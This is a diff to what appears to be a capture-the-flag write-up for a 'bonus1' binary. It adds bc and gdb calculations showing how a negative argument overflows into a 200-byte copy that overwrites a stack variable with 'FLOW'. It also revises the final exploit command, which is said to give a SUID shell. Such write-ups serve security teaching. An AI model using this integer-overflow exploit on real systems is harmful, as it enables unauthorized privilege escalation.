@@ -19,6 +19,31 @@ It then tests if nbytes is equal to 0x574f4c46 and if it is, the flow continues 
 
 So we need to find a negative number that as interpreted as unsigned int and multiplied by 4 gives us a sufficient number of copied bytes from argv[2] so that nbytes (on the stack) is overwriting with the value 0x574f4c46 which is 'FLOW' in ascii.
 
+$ bc
+bc 1.07.1
+Copyright 1991-1994, 1997, 1998, 2000, 2004, 2006, 2008, 2012-2017 Free Software Foundation, Inc.
+This is free software with ABSOLUTELY NO WARRANTY.
+For details type `warranty'. 
+ibase=10
+obase=2
+200
+11001000
+200/4
+110010
+obase=10
+ibase=2
+10000000000000000000000000110010
+2147483698
+
+$ gdb
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+(gdb) print (int)2147483698
+$1 = -2147483598
+(gdb) print (int)2147483698 * 4
+$2 = 200
+
+
 Finally we do:
-./bonus1 -1073741775  "`python -c 'import sys; sys.stdout.write("FLOW" * 400)'`"
+./bonus1 -2147483598  "`python -c 'import sys; sys.stdout.write("FLOW" * 400)'`"
 and we get a SUID-shell.
